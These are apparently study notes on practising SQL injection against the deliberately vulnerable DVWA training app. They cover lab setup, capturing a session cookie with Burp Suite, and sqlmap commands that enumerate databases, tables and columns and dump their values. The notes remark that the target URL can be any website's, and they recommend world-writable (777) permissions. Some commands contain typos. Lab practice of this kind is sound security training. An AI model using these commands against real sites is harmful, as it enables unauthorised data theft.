1. Injecting SQL queries in http url or any post method
2. For practice, download 'Damn Vulnerable Web Application' from http://www.dvwa.co.uk/
    - Extract the files
    - `cp -Rv <path/to/extracted_folder> /var/www/` : Copy the extracted_folder to /var/www/
    - `chmod -Rv 777 /var/www/extracted_folder` : Make the folder public
3. Setup database
    - `apt-get install mysql-server`
    - `apt-get install mysql-client`
    - `service mysql start`
    - `mysql -h localhost -u root -p <password>` : IF root has no password then no need to provide '-p' argument
    - `SET PASSWORD for root@localhost=PASSWORD('newpassword);` : To set password for root inside mysql shell
    - Go to 'localhost' and create database
4. Go to your system IP and start practicing
5. Burp Suite can be used to capture the session info of the website. Copy the phpsessionid from the session info
6. Some useful SQL injections using sqlmap:
    - `sqlmap -u "http://192.168.1.103/DVWA-1.0.8/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<id from step 5>"
    - url after -u is the vulnerable url of any website
    - phpsessionid is the session id captured using burp suite
    - Other parameters for sqlmap:
        - '-dbs' : lists the available database in the given url
        - '-D <database name> --tables' : List available tables in specified database name
        - '-T <table_name> --column' : List available columns in specified table name
        - '-C <column name> --dump' : Copy all the values of specified comma seprated list of column names
